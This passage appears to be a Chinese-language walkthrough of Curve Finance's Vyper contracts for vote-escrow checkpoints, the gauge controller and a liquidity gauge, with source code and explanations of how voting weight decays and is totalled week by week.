old_locked.end > block.timestamp and old_locked.amount > 0:\n            u_old.slope = old_locked.amount / MAXTIME\n            u_old.bias = u_old.slope * convert(old_locked.end - block.timestamp, int128)\n        if new_locked.end > block.timestamp and new_locked.amount > 0:\n            u_new.slope = new_locked.amount / MAXTIME\n            u_new.bias = u_new.slope * convert(new_locked.end - block.timestamp, int128)\n\n        # Read values of scheduled changes in the slope\n        # old_locked.end can be in the past and in the future\n        # new_locked.end can ONLY by in the FUTURE unless everything expired: than zeros\n        old_dslope = self.slope_changes[old_locked.end]\n        if new_locked.end != 0:\n            if new_locked.end == old_locked.end:\n                new_dslope = old_dslope\n            else:\n                new_dslope = self.slope_changes[new_locked.end]\n\n    last_point: Point = Point(&#123;bias: 0, slope: 0, ts: block.timestamp, blk: block.number&#125;)\n    if _epoch > 0:\n        last_point = self.point_history[_epoch]\n    last_checkpoint: uint256 = last_point.ts\n    # initial_last_point is used for extrapolation to calculate block number\n    # (approximately, for *At methods) and save them\n    # as we cannot figure that out exactly from inside the contract\n    initial_last_point: Point = last_point\n    block_slope: uint256 = 0  # dblock/dt\n    if block.timestamp > last_point.ts:\n        block_slope = MULTIPLIER * (block.number - last_point.blk) / (block.timestamp - last_point.ts)\n    # If last point is already recorded in this block, slope=0\n    # But that's ok b/c we know the block in such case\n\n    # Go over weeks to fill history and calculate what the current point is\n    t_i: uint256 = (last_checkpoint / WEEK) * WEEK\n    for i in range(255):\n        # Hopefully it won't happen that this won't get used in 5 years!\n        # If it does, users will be able to withdraw but vote weight will be broken\n        t_i += WEEK\n        d_slope: int128 = 0\n        if t_i > block.timestamp:\n            t_i = block.timestamp\n        else:\n            d_slope = self.slope_changes[t_i]\n        last_point.bias -= last_point.slope * convert(t_i - last_checkpoint, int128)\n        last_point.slope += d_slope\n        if last_point.bias &lt; 0:  # This can happen\n            last_point.bias = 0\n        if last_point.slope &lt; 0:  # This cannot happen - just in case\n            last_point.slope = 0\n        last_checkpoint = t_i\n        last_point.ts = t_i\n        last_point.blk = initial_last_point.blk + block_slope * (t_i - initial_last_point.ts) / MULTIPLIER\n        _epoch += 1\n        if t_i == block.timestamp:\n            last_point.blk = block.number\n            break\n        else:\n            self.point_history[_epoch] = last_point\n\n    self.epoch = _epoch\n    # Now point_history is filled until t=now\n\n    if addr != ZERO_ADDRESS:\n        # If last point was in this block, the slope change has been applied already\n        # But in such case we have 0 slope(s)\n        last_point.slope += (u_new.slope - u_old.slope)\n        last_point.bias += (u_new.bias - u_old.bias)\n        if last_point.slope &lt; 0:\n            last_point.slope = 0\n        if last_point.bias &lt; 0:\n            last_point.bias = 0\n\n    # Record the changed point into history\n    self.point_history[_epoch] = last_point\n\n    if addr != ZERO_ADDRESS:\n        # Schedule the slope changes (slope is going down)\n        # We subtract new_user_slope from [new_locked.end]\n        # and add old_user_slope to [old_locked.end]\n        if old_locked.end > block.timestamp:\n            # old_dslope was &lt;something> - u_old.slope, so we cancel that\n            old_dslope += u_old.slope\n            if new_locked.end == old_locked.end:\n                old_dslope -= u_new.slope  # It was a new deposit, not extension\n            self.slope_changes[old_locked.end] = old_dslope\n\n        if new_locked.end > block.timestamp:\n            if new_locked.end > old_locked.end:\n                new_dslope -= u_new.slope  # old slope disappeared at this point\n                self.slope_changes[new_locked.end] = new_dslope\n            # else: we recorded it already in old_dslope\n\n        # Now handle user history\n        user_epoch: uint256 = self.user_point_epoch[addr] + 1\n\n        self.user_point_epoch[addr] = user_epoch\n        u_new.ts = block.timestamp\n        u_new.blk = block.number\n        self.user_point_history[addr][user_epoch] = u_new\n\n\n该函数用于将全局和每个用户数据记录到point每一次选择语句都注释了进行的操作以及目的，逻辑比较复杂，需要仔细分析\nfind_block_epoch函数使用折半查找检索近似block对应的point，进而在balanceAt以及totalsupplyAt函数中估计block对应的时间戳\nbalanceOf计算在某一时间点时候对应的vote weight，balanceOf计算在对应block下的vote weight\n\ncase 1\n\n_epoch&lt;max_epoch\n\n\n\ncase 2\n\n_epoch&gt;&#x3D;max_epoch\n\n\n\ntotalsupply计算在某一时间点时候对应的total vote weight，totalsupplyAt计算在对应block下的total vote weight\n其辅助函数为：\ndef find_block_epoch(_block: uint256, max_epoch: uint256) -> uint256:\n    \"\"\"\n    @notice Binary search to estimate timestamp for block number\n    @param _block Block to find\n    @param max_epoch Don't go beyond this epoch\n    @return Approximate timestamp for block\n    \"\"\"\n    # Binary search\n    _min: uint256 = 0\n    _max: uint256 = max_epoch\n    for i in range(128):  # Will be always enough for 128-bit numbers\n        if _min >= _max:\n            break\n        _mid: uint256 = (_min + _max + 1) / 2\n        if self.point_history[_mid].blk &lt;= _block:\n            _min = _mid\n        else:\n            _max = _mid - 1\n    return _min\n\ncase 1\n\ntarget_epoch &lt; _epoch\n\n\n\ncase 2\n\ntarget_epoch &gt;&#x3D; _epoch\n\n\n\n其核心函数为：\ndef supply_at(point: Point, t: uint256) -> uint256:\n    \"\"\"\n    @notice Calculate total voting power at some point in the past\n    @param point The point (bias/slope) to start search from\n    @param t Time to calculate the total voting power at\n    @return Total voting power at that time\n    \"\"\"\n    last_point: Point = point\n    t_i: uint256 = (last_point.ts / WEEK) * WEEK\n    for i in range(255):\n        t_i += WEEK\n        d_slope: int128 = 0\n        if t_i > t:\n            t_i = t\n        else:\n            d_slope = self.slope_changes[t_i]\n        last_point.bias -= last_point.slope * convert(t_i - last_point.ts, int128)\n        if t_i == t:\n            break\n        last_point.slope += d_slope\n        last_point.ts = t_i\n\n    if last_point.bias &lt; 0:\n        last_point.bias = 0\n    return convert(last_point.bias, uint256)\n\n取最近一次point，对应ts四舍五入为周，遍历所有WEEK，以最新一次的bias累加计算\nGauge ControllerCode\nClick to see more\n# @version 0.2.4\n\n\"\"\"\n@title Gauge Controller\n@author Curve Finance\n@license MIT\n@notice Controls liquidity gauges and the issuance of coins through the gauges\n\"\"\"\n\n# 7 * 86400 seconds - all future times are rounded by week\nWEEK: constant(uint256) = 604800\n\n# Cannot change weight votes more often than once in 10 days\nWEIGHT_VOTE_DELAY: constant(uint256) = 10 * 86400\n\n\nstruct Point:\n    bias: uint256\n    slope: uint256\n\nstruct VotedSlope:\n    slope: uint256\n    power: uint256\n    end: uint256\n\n\ninterface VotingEscrow:\n    def get_last_user_slope(addr: address) -> int128: view\n    def locked__end(addr: address) -> uint256: view\n\n\nevent CommitOwnership:\n    admin: address\n\nevent ApplyOwnership:\n    admin: address\n\nevent AddType:\n    name: String[64]\n    type_id: int128\n\nevent NewTypeWeight:\n    type_id: int128\n    time: uint256\n    weight: uint256\n    total_weight: uint256\n\nevent NewGaugeWeight:\n    gauge_address: address\n    time: uint256\n    weight: uint256\n    total_weight: uint256\n\nevent VoteForGauge:\n    time: uint256\n    user: address\n    gauge_addr: address\n    weight: uint256\n\nevent NewGauge:\n    addr: address\n    gauge_type: int128\n    weight: uint256\n\n\nMULTIPLIER: constant(uint256) = 10 ** 18\n\nadmin: public(address)  # Can and will be a smart contract\nfuture_admin: public(address)  # Can and will be a smart contract\n\ntoken: public(address)  # CRV token\nvoting_escrow: public(address)  # Voting escrow\n\n# Gauge parameters\n# All numbers are \"fixed point\" on the basis of 1e18\nn_gauge_types: public(int128)\nn_gauges: public(int128)\ngauge_type_names: public(HashMap[int128, String[64]])\n\n# Needed for enumeration\ngauges: public(address[1000000000])\n\n# we increment values by 1 prior to storing them here so we can rely on a value\n# of zero as meaning the gauge has not been set\ngauge_types_: HashMap[address, int128]\n\nvote_user_slopes: public(HashMap[address, HashMap[address, VotedSlope]])  # user -> gauge_addr -> VotedSlope\nvote_user_power: public(HashMap[address, uint256])  # Total vote power used by user\nlast_user_vote: public(HashMap[address, HashMap[address, uint256]])  # Last user vote's timestamp for each gauge address\n\n# Past and scheduled points for gauge weight, sum of weights per type, total weight\n# Point is for bias+slope\n# changes_* are for changes in slope\n# time_* are for the last change timestamp\n# timestamps are rounded to whole weeks\n\npoints_weight: public(HashMap[address, HashMap[uint256, Point]])  # gauge_addr -> time -> Point\nchanges_weight: HashMap[address, HashMap[uint256, uint256]]  # gauge_addr -> time -> slope\ntime_weight: public(HashMap[address, uint256])  # gauge_addr -> last scheduled time (next week)\n\npoints_sum: public(HashMap[int128, HashMap[uint256, Point]])  # type_id -> time -> Point\nchanges_sum: HashMap[int128, HashMap[uint256, uint256]]  # type_id -> time -> slope\ntime_sum: public(uint256[1000000000])  # type_id -> last scheduled time (next week)\n\npoints_total: public(HashMap[uint256, uint256])  # time -> total weight\ntime_total: public(uint256)  # last scheduled time\n\npoints_type_weight: public(HashMap[int128, HashMap[uint256, uint256]])  # type_id -> time -> type weight\ntime_type_weight: public(uint256[1000000000])  # type_id -> last scheduled time (next week)\n\n\n@external\ndef __init__(_token: address, _voting_escrow: address):\n    \"\"\"\n    @notice Contract constructor\n    @param _token `ERC20CRV` contract address\n    @param _voting_escrow `VotingEscrow` contract address\n    \"\"\"\n    assert _token != ZERO_ADDRESS\n    assert _voting_escrow != ZERO_ADDRESS\n\n    self.admin = msg.sender\n    self.token = _token\n    self.voting_escrow = _voting_escrow\n    self.time_total = block.timestamp / WEEK * WEEK\n\n\n@external\ndef commit_transfer_ownership(addr: address):\n    \"\"\"\n    @notice Transfer ownership of GaugeController to `addr`\n    @param addr Address to have ownership transferred to\n    \"\"\"\n    assert msg.sender == self.admin  # dev: admin only\n    self.future_admin = addr\n    log CommitOwnership(addr)\n\n\n@external\ndef apply_transfer_ownership():\n    \"\"\"\n    @notice Apply pending ownership transfer\n    \"\"\"\n    assert msg.sender == self.admin  # dev: admin only\n    _admin: address = self.future_admin\n    assert _admin != ZERO_ADDRESS  # dev: admin not set\n    self.admin = _admin\n    log ApplyOwnership(_admin)\n\n\n@external\n@view\ndef gauge_types(_addr: address) -> int128:\n    \"\"\"\n    @notice Get gauge type for address\n    @param _addr Gauge address\n    @return Gauge type id\n    \"\"\"\n    gauge_type: int128 = self.gauge_types_[_addr]\n    assert gauge_type != 0\n\n    return gauge_type - 1\n\n\n@internal\ndef _get_type_weight(gauge_type: int128) -> uint256:\n    \"\"\"\n    @notice Fill historic type weights week-over-week for missed checkins\n            and return the type weight for the future week\n    @param gauge_type Gauge type id\n    @return Type weight\n    \"\"\"\n    t: uint256 = self.time_type_weight[gauge_type]\n    if t > 0:\n        w: uint256 = self.points_type_weight[gauge_type][t]\n        for i in range(500):\n            if t > block.timestamp:\n                break\n            t += WEEK\n            self.points_type_weight[gauge_type][t] = w\n            if t > block.timestamp:\n                self.time_type_weight[gauge_type] = t\n        return w\n    else:\n        return 0\n\n\n@internal\ndef _get_sum(gauge_type: int128) -> uint256:\n    \"\"\"\n    @notice Fill sum of gauge weights for the same type week-over-week for\n            missed checkins and return the sum for the future week\n    @param gauge_type Gauge type id\n    @return Sum of weights\n    \"\"\"\n    t: uint256 = self.time_sum[gauge_type]\n    if t > 0:\n        pt: Point = self.points_sum[gauge_type][t]\n        for i in range(500):\n            if t > block.timestamp:\n                break\n            t += WEEK\n            d_bias: uint256 = pt.slope * WEEK\n            if pt.bias > d_bias:\n                pt.bias -= d_bias\n                d_slope: uint256 = self.changes_sum[gauge_type][t]\n                pt.slope -= d_slope\n            else:\n                pt.bias = 0\n                pt.slope = 0\n            self.points_sum[gauge_type][t] = pt\n            if t > block.timestamp:\n                self.time_sum[gauge_type] = t\n        return pt.bias\n    else:\n        return 0\n\n\n@internal\ndef _get_total() -> uint256:\n    \"\"\"\n    @notice Fill historic total weights week-over-week for missed checkins\n            and return the total for the future week\n    @return Total weight\n    \"\"\"\n    t: uint256 = self.time_total\n    _n_gauge_types: int128 = self.n_gauge_types\n    if t > block.timestamp:\n        # If we have already checkpointed - still need to change the value\n        t -= WEEK\n    pt: uint256 = self.points_total[t]\n\n    for gauge_type in range(100):\n        if gauge_type == _n_gauge_types:\n            break\n        self._get_sum(gauge_type)\n        self._get_type_weight(gauge_type)\n\n    for i in range(500):\n        if t > block.timestamp:\n            break\n        t += WEEK\n        pt = 0\n        # Scales as n_types * n_unchecked_weeks (hopefully 1 at most)\n        for gauge_type in range(100):\n            if gauge_type == _n_gauge_types:\n                break\n            type_sum: uint256 = self.points_sum[gauge_type][t].bias\n            type_weight: uint256 = self.points_type_weight[gauge_type][t]\n            pt += type_sum * type_weight\n        self.points_total[t] = pt\n\n        if t > block.timestamp:\n            self.time_total = t\n    return pt\n\n\n@internal\ndef _get_weight(gauge_addr: address) -> uint256:\n    \"\"\"\n    @notice Fill historic gauge weights week-over-week for missed checkins\n            and return the total for the future week\n    @param gauge_addr Address of the gauge\n    @return Gauge weight\n    \"\"\"\n    t: uint256 = self.time_weight[gauge_addr]\n    if t > 0:\n        pt: Point = self.points_weight[gauge_addr][t]\n        for i in range(500):\n            if t > block.timestamp:\n                break\n            t += WEEK\n            d_bias: uint256 = pt.slope * WEEK\n            if pt.bias > d_bias:\n                pt.bias -= d_bias\n                d_slope: uint256 = self.changes_weight[gauge_addr][t]\n                pt.slope -= d_slope\n            else:\n                pt.bias = 0\n                pt.slope = 0\n            self.points_weight[gauge_addr][t] = pt\n            if t > block.timestamp:\n                self.time_weight[gauge_addr] = t\n        return pt.bias\n    else:\n        return 0\n\n\n@external\ndef add_gauge(addr: address, gauge_type: int128, weight: uint256 = 0):\n    \"\"\"\n    @notice Add gauge `addr` of type `gauge_type` with weight `weight`\n    @param addr Gauge address\n    @param gauge_type Gauge type\n    @param weight Gauge weight\n    \"\"\"\n    assert msg.sender == self.admin\n    assert (gauge_type >= 0) and (gauge_type &lt; self.n_gauge_types)\n    assert self.gauge_types_[addr] == 0  # dev: cannot add the same gauge twice\n\n    n: int128 = self.n_gauges\n    self.n_gauges = n + 1\n    self.gauges[n] = addr\n\n    self.gauge_types_[addr] = gauge_type + 1\n    next_time: uint256 = (block.timestamp + WEEK) / WEEK * WEEK\n\n    if weight > 0:\n        _type_weight: uint256 = self._get_type_weight(gauge_type)\n        _old_sum: uint256 = self._get_sum(gauge_type)\n        _old_total: uint256 = self._get_total()\n\n        self.points_sum[gauge_type][next_time].bias = weight + _old_sum\n        self.time_sum[gauge_type] = next_time\n        self.points_total[next_time] = _old_total + _type_weight * weight\n        self.time_total = next_time\n\n        self.points_weight[addr][next_time].bias = weight\n\n    if self.time_sum[gauge_type] == 0:\n        self.time_sum[gauge_type] = next_time\n    self.time_weight[addr] = next_time\n\n    log NewGauge(addr, gauge_type, weight)\n\n\n@external\ndef checkpoint():\n    \"\"\"\n    @notice Checkpoint to fill data common for all gauges\n    \"\"\"\n    self._get_total()\n\n\n@external\ndef checkpoint_gauge(addr: address):\n    \"\"\"\n    @notice Checkpoint to fill data for both a specific gauge and common for all gauges\n    @param addr Gauge address\n    \"\"\"\n    self._get_weight(addr)\n    self._get_total()\n\n\n@internal\n@view\ndef _gauge_relative_weight(addr: address, time: uint256) -> uint256:\n    \"\"\"\n    @notice Get Gauge relative weight (not more than 1.0) normalized to 1e18\n            (e.g. 1.0 == 1e18). Inflation which will be received by it is\n            inflation_rate * relative_weight / 1e18\n    @param addr Gauge address\n    @param time Relative weight at the specified timestamp in the past or present\n    @return Value of relative weight normalized to 1e18\n    \"\"\"\n    t: uint256 = time / WEEK * WEEK\n    _total_weight: uint256 = self.points_total[t]\n\n    if _total_weight > 0:\n        gauge_type: int128 = self.gauge_types_[addr] - 1\n        _type_weight: uint256 = self.points_type_weight[gauge_type][t]\n        _gauge_weight: uint256 = self.points_weight[addr][t].bias\n        return MULTIPLIER * _type_weight * _gauge_weight / _total_weight\n\n    else:\n        return 0\n\n\n@external\n@view\ndef gauge_relative_weight(addr: address, time: uint256 = block.timestamp) -> uint256:\n    \"\"\"\n    @notice Get Gauge relative weight (not more than 1.0) normalized to 1e18\n            (e.g. 1.0 == 1e18). Inflation which will be received by it is\n            inflation_rate * relative_weight / 1e18\n    @param addr Gauge address\n    @param time Relative weight at the specified timestamp in the past or present\n    @return Value of relative weight normalized to 1e18\n    \"\"\"\n    return self._gauge_relative_weight(addr, time)\n\n\n@external\ndef gauge_relative_weight_write(addr: address, time: uint256 = block.timestamp) -> uint256:\n    \"\"\"\n    @notice Get gauge weight normalized to 1e18 and also fill all the unfilled\n            values for type and gauge records\n    @dev Any address can call, however nothing is recorded if the values are filled already\n    @param addr Gauge address\n    @param time Relative weight at the specified timestamp in the past or present\n    @return Value of relative weight normalized to 1e18\n    \"\"\"\n    self._get_weight(addr)\n    self._get_total()  # Also calculates get_sum\n    return self._gauge_relative_weight(addr, time)\n\n\n\n\n@internal\ndef _change_type_weight(type_id: int128, weight: uint256):\n    \"\"\"\n    @notice Change type weight\n    @param type_id Type id\n    @param weight New type weight\n    \"\"\"\n    old_weight: uint256 = self._get_type_weight(type_id)\n    old_sum: uint256 = self._get_sum(type_id)\n    _total_weight: uint256 = self._get_total()\n    next_time: uint256 = (block.timestamp + WEEK) / WEEK * WEEK\n\n    _total_weight = _total_weight + old_sum * weight - old_sum * old_weight\n    self.points_total[next_time] = _total_weight\n    self.points_type_weight[type_id][next_time] = weight\n    self.time_total = next_time\n    self.time_type_weight[type_id] = next_time\n\n    log NewTypeWeight(type_id, next_time, weight, _total_weight)\n\n\n@external\ndef add_type(_name: String[64], weight: uint256 = 0):\n    \"\"\"\n    @notice Add gauge type with name `_name` and weight `weight`\n    @param _name Name of gauge type\n    @param weight Weight of gauge type\n    \"\"\"\n    assert msg.sender == self.admin\n    type_id: int128 = self.n_gauge_types\n    self.gauge_type_names[type_id] = _name\n    self.n_gauge_types = type_id + 1\n    if weight != 0:\n        self._change_type_weight(type_id, weight)\n        log AddType(_name, type_id)\n\n\n@external\ndef change_type_weight(type_id: int128, weight: uint256):\n    \"\"\"\n    @notice Change gauge type `type_id` weight to `weight`\n    @param type_id Gauge type id\n    @param weight New Gauge weight\n    \"\"\"\n    assert msg.sender == self.admin\n    self._change_type_weight(type_id, weight)\n\n\n@internal\ndef _change_gauge_weight(addr: address, weight: uint256):\n    # Change gauge weight\n    # Only needed when testing in reality\n    gauge_type: int128 = self.gauge_types_[addr] - 1\n    old_gauge_weight: uint256 = self._get_weight(addr)\n    type_weight: uint256 = self._get_type_weight(gauge_type)\n    old_sum: uint256 = self._get_sum(gauge_type)\n    _total_weight: uint256 = self._get_total()\n    next_time: uint256 = (block.timestamp + WEEK) / WEEK * WEEK\n\n    self.points_weight[addr][next_time].bias = weight\n    self.time_weight[addr] = next_time\n\n    new_sum: uint256 = old_sum + weight - old_gauge_weight\n    self.points_sum[gauge_type][next_time].bias = new_sum\n    self.time_sum[gauge_type] = next_time\n\n    _total_weight = _total_weight + new_sum * type_weight - old_sum * type_weight\n    self.points_total[next_time] = _total_weight\n    self.time_total = next_time\n\n    log NewGaugeWeight(addr, block.timestamp, weight, _total_weight)\n\n\n@external\ndef change_gauge_weight(addr: address, weight: uint256):\n    \"\"\"\n    @notice Change weight of gauge `addr` to `weight`\n    @param addr `GaugeController` contract address\n    @param weight New Gauge weight\n    \"\"\"\n    assert msg.sender == self.admin\n    self._change_gauge_weight(addr, weight)\n\n\n@external\ndef vote_for_gauge_weights(_gauge_addr: address, _user_weight: uint256):\n    \"\"\"\n    @notice Allocate voting power for changing pool weights\n    @param _gauge_addr Gauge which `msg.sender` votes for\n    @param _user_weight Weight for a gauge in bps (units of 0.01%). Minimal is 0.01%. Ignored if 0\n    \"\"\"\n    escrow: address = self.voting_escrow\n    slope: uint256 = convert(VotingEscrow(escrow).get_last_user_slope(msg.sender), uint256)\n    lock_end: uint256 = VotingEscrow(escrow).locked__end(msg.sender)\n    _n_gauges: int128 = self.n_gauges\n    next_time: uint256 = (block.timestamp + WEEK) / WEEK * WEEK\n    assert lock_end > next_time, \"Your token lock expires too soon\"\n    assert (_user_weight >= 0) and (_user_weight &lt;= 10000), \"You used all your voting power\"\n    assert block.timestamp >= self.last_user_vote[msg.sender][_gauge_addr] + WEIGHT_VOTE_DELAY, \"Cannot vote so often\"\n\n    gauge_type: int128 = self.gauge_types_[_gauge_addr] - 1\n    assert gauge_type >= 0, \"Gauge not added\"\n    # Prepare slopes and biases in memory\n    old_slope: VotedSlope = self.vote_user_slopes[msg.sender][_gauge_addr]\n    old_dt: uint256 = 0\n    if old_slope.end > next_time:\n        old_dt = old_slope.end - next_time\n    old_bias: uint256 = old_slope.slope * old_dt\n    new_slope: VotedSlope = VotedSlope(&#123;\n        slope: slope * _user_weight / 10000,\n        end: lock_end,\n        power: _user_weight\n    &#125;)\n    new_dt: uint256 = lock_end - next_time  # dev: raises when expired\n    new_bias: uint256 = new_slope.slope * new_dt\n\n    # Check and update powers (weights) used\n    power_used: uint256 = self.vote_user_power[msg.sender]\n    power_used = power_used + new_slope.power - old_slope.power\n    self.vote_user_power[msg.sender] = power_used\n    assert (power_used >= 0) and (power_used &lt;= 10000), 'Used too much power'\n\n    ## Remove old and schedule new slope changes\n    # Remove slope changes for old slopes\n    # Schedule recording of initial slope for next_time\n    old_weight_bias: uint256 = self._get_weight(_gauge_addr)\n    old_weight_slope: uint256 = self.points_weight[_gauge_addr][next_time].slope\n    old_sum_bias: uint256 = self._get_sum(gauge_type)\n    old_sum_slope: uint256 = self.points_sum[gauge_type][next_time].slope\n\n    self.points_weight[_gauge_addr][next_time].bias = max(old_weight_bias + new_bias, old_bias) - old_bias\n    self.points_sum[gauge_type][next_time].bias = max(old_sum_bias + new_bias, old_bias) - old_bias\n    if old_slope.end > next_time:\n        self.points_weight[_gauge_addr][next_time].slope = max(old_weight_slope + new_slope.slope, old_slope.slope) - old_slope.slope\n        self.points_sum[gauge_type][next_time].slope = max(old_sum_slope + new_slope.slope, old_slope.slope) - old_slope.slope\n    else:\n        self.points_weight[_gauge_addr][next_time].slope += new_slope.slope\n        self.points_sum[gauge_type][next_time].slope += new_slope.slope\n    if old_slope.end > block.timestamp:\n        # Cancel old slope changes if they still didn't happen\n        self.changes_weight[_gauge_addr][old_slope.end] -= old_slope.slope\n        self.changes_sum[gauge_type][old_slope.end] -= old_slope.slope\n    # Add slope changes for new slopes\n    self.changes_weight[_gauge_addr][new_slope.end] += new_slope.slope\n    self.changes_sum[gauge_type][new_slope.end] += new_slope.slope\n\n    self._get_total()\n\n    self.vote_user_slopes[msg.sender][_gauge_addr] = new_slope\n\n    # Record last action time\n    self.last_user_vote[msg.sender][_gauge_addr] = block.timestamp\n\n    log VoteForGauge(block.timestamp, msg.sender, _gauge_addr, _user_weight)\n\n\n@external\n@view\ndef get_gauge_weight(addr: address) -> uint256:\n    \"\"\"\n    @notice Get current gauge weight\n    @param addr Gauge address\n    @return Gauge weight\n    \"\"\"\n    return self.points_weight[addr][self.time_weight[addr]].bias\n\n\n@external\n@view\ndef get_type_weight(type_id: int128) -> uint256:\n    \"\"\"\n    @notice Get current type weight\n    @param type_id Type id\n    @return Type weight\n    \"\"\"\n    return self.points_type_weight[type_id][self.time_type_weight[type_id]]\n\n\n@external\n@view\ndef get_total_weight() -> uint256:\n    \"\"\"\n    @notice Get current total (type-weighted) weight\n    @return Total weight\n    \"\"\"\n    return self.points_total[self.time_total]\n\n\n@external\n@view\ndef get_weights_sum_per_type(type_id: int128) -> uint256:\n    \"\"\"\n    @notice Get sum of gauge weights per type\n    @param type_id Type id\n    @return Sum of gauge weights\n    \"\"\"\n    return self.points_sum[type_id][self.time_sum[type_id]].bias\n\n\n\nAnalyzeGauge—-Curve的专用名词，意为储蓄池子\n变量名称在行后给出了比较详细的解释，函数开头也做出了功能解释\n_get_type_weight，_get_sum，_get_total函数逻辑性同，填补历史数据并且返回未来一周的数据\n_gauge_relative_weight函数返回*1e18的相对权重值，在Gauge合约内参与reward的计算\n\n_change_type_weight函数为add_type函数以及change_type_weight函数的核心函数实现type的增加以及更改type_weight的功能\ndef _change_type_weight(type_id: int128, weight: uint256):\n    \"\"\"\n    @notice Change type weight\n    @param type_id Type id\n    @param weight New type weight\n    \"\"\"\n    old_weight: uint256 = self._get_type_weight(type_id)\n    old_sum: uint256 = self._get_sum(type_id)\n    _total_weight: uint256 = self._get_total()\n    next_time: uint256 = (block.timestamp + WEEK) / WEEK * WEEK\n\n    _total_weight = _total_weight + old_sum * weight - old_sum * old_weight\n    self.points_total[next_time] = _total_weight\n    self.points_type_weight[type_id][next_time] = weight\n    self.time_total = next_time\n    self.time_type_weight[type_id] = next_time\n\n    log NewTypeWeight(type_id, next_time, weight, _total_weight)\n\n\n\nOne Gauge(Gauge[0])Code\nClck to see more\n# @version 0.2.4\n\"\"\"\n@title Liquidity Gauge\n@author Curve Finance\n@license MIT\n@notice Used for measuring liquidity and insurance\n\"\"\"\n\nfrom vyper.interfaces import ERC20\n\ninterface CRV20:\n    def future_epoch_time_write() -> uint256: nonpayable\n    def rate() -> uint256: view\n\ninterface Controller:\n    def period() -> int128: view\n    def period_write() -> int128: nonpayable\n    def period_timestamp(p: int128) -> uint256: view\n    def gauge_relative_weight(addr: address, time: uint256) -> uint256: view\n    def voting_escrow() -> address: view\n    def checkpoint(): nonpayable\n    def checkpoint_gauge(addr: address): nonpayable\n\ninterface Minter:\n    def token() -> address: view\n    def controller() -> address: view\n    def minted(user: address, gauge: address) -> uint256: view\n\ninterface VotingEscrow:\n    def user_point_epoch(addr: address) -> uint256: view\n    def user_point_history__ts(addr: address, epoch: uint256) -> uint256: view\n\n\nevent Deposit:\n    provider: indexed(address)\n    value: uint256\n\nevent Withdraw:\n    provider: indexed(address)\n    value: uint256\n\nevent UpdateLiquidityLimit:\n    user: address\n    original_balance: uint256\n    original_supply: uint256\n    working_balance: uint256\n    working_supply: uint256\n\n\nTOKENLESS_PRODUCTION: constant(uint256) = 40\nBOOST_WARMUP: constant(uint256) = 2 * 7 * 86400\nWEEK: constant(uint256) = 604800\n\nminter: public(address)\ncrv_token: public(address)\nlp_token: public(address)\ncontroller: public(address)\nvoting_escrow: public(address)\nbalanceOf: public(HashMap[address, uint256])\ntotalSupply: public(uint256)\nfuture_epoch_time: public(uint256)\n\n# caller -> recipient -> can deposit?\napproved_to_deposit: public(HashMap[address, HashMap[address, bool]])\n\nworking_balances: public(HashMap[address, uint256])\nworking_supply: public(uint256)\n\n# The goal is to be able to calculate ∫(rate * balance / totalSupply dt) from 0 till checkpoint\n# All values are kept in units of being multiplied by 1e18\nperiod: public(int128)\nperiod_timestamp: public(uint256[100000000000000000000000000000])\n\n# 1e18 * ∫(rate(t) / totalSupply(t) dt) from 0 till checkpoint\nintegrate_inv_supply: public(uint256[100000000000000000000000000000])  # bump epoch when rate() changes\n\n# 1e18 * ∫(rate(t) / totalSupply(t) dt) from (last_action) till checkpoint\nintegrate_inv_supply_of: public(HashMap[address, uint256])\nintegrate_checkpoint_of: public(HashMap[address, uint256])\n\n\n# ∫(balance * rate(t) / totalSupply(t) dt) from 0 till checkpoint\n# Units: rate * t = already number of coins per address to issue\nintegrate_fraction: public(HashMap[address, uint256])\n\ninflation_rate: public(uint256)\n\n\n@external\ndef __init__(lp_addr: address, _minter: address):\n    \"\"\"\n    @notice Contract constructor\n    @param lp_addr Liquidity Pool contract address\n    @param _minter Minter contract address\n    \"\"\"\n\n    assert lp_addr != ZERO_ADDRESS\n    assert _minter != ZERO_ADDRESS\n\n    self.lp_token = lp_addr\n    self.minter = _minter\n    crv_addr: address = Minter(_minter).token()\n    self.crv_token = crv_addr\n    controller_addr: address = Minter(_minter).controller()\n    self.controller = controller_addr\n    self.voting_escrow = Controller(controller_addr).voting_escrow()\n    self.period_timestamp[0] = block.timestamp\n    self.inflation_rate = CRV20(crv_addr).rate()\n    self.future_epoch_time = CRV20(crv_addr).future_epoch_time_write()\n\n\n@internal\ndef _update_liquidity_limit(addr: address, l: uint256, L: uint256):\n    \"\"\"\n    @notice Calculate limits which depend on the amount of CRV token per-user.\n            Effectively it calculates working balances to apply amplification\n            of CRV production by CRV\n    @param addr User address\n    @param l User's amount of liquidity (LP tokens)\n    @param L Total amount of liquidity (LP tokens)\n    \"\"\"\n    # To be called after totalSupply is updated\n    _voting_escrow: address = self.voting_escrow\n    voting_balance: uint256 = ERC20(_voting_escrow).balanceOf(addr)\n    voting_total: uint256 = ERC20(_voting_escrow).totalSupply()\n\n    lim: uint256 = l * TOKENLESS_PRODUCTION / 100\n    if (voting_total > 0) and (block.timestamp > self.period_timestamp[0] + BOOST_WARMUP):\n        lim += L * voting_balance / voting_total * (100 - TOKENLESS_PRODUCTION) / 100\n\n    lim = min(l, lim)\n    old_bal: uint256 = self.working_balances[addr]\n    self.working_balances[addr] = lim\n    _working_supply: uint256 = self.working_supply + lim - old_bal\n    self.working_supply = _working_supply\n\n    log UpdateLiquidityLimit(addr, l, L, lim, _working_supply)\n\n\n@internal\ndef _checkpoint(addr: address):\n    \"\"\"\n    @notice Checkpoint for a user\n    @param addr User address\n    \"\"\"\n    _token: address = self.crv_token\n    _controller: address = self.controller\n    _period: int128 = self.period\n    _period_time: uint256 = self.period_timestamp[_period]\n    _integrate_inv_supply: uint256 = self.integrate_inv_supply[_period]\n    rate: uint256 = self.inflation_rate\n    new_rate: uint256 = rate\n    prev_future_epoch: uint256 = self.future_epoch_time\n    if prev_future_epoch >= _period_time:\n        self.future_epoch_time = CRV20(_token).future_epoch_time_write()\n        new_rate = CRV20(_token).rate()\n        self.inflation_rate = new_rate\n    Controller(_controller).checkpoint_gauge(self)\n\n    _working_balance: uint256 = self.working_balances[addr]\n    _working_supply: uint256 = self.working_supply\n\n    # Update integral of 1/supply\n    if block.timestamp > _period_time:\n        prev_week_time: uint256 = _period_time\n        week_time: uint256 = min((_period_time + WEEK) / WEEK * WEEK, block.timestamp)\n\n        for i in range(500):\n            dt: uint256 = week_time - prev_week_time\n            w: uint256 = Controller(_controller).gauge_relative_weight(self, prev_week_time / WEEK * WEEK)\n\n            if _working_supply > 0:\n                if prev_future_epoch >= prev_week_time and prev_future_epoch &lt; 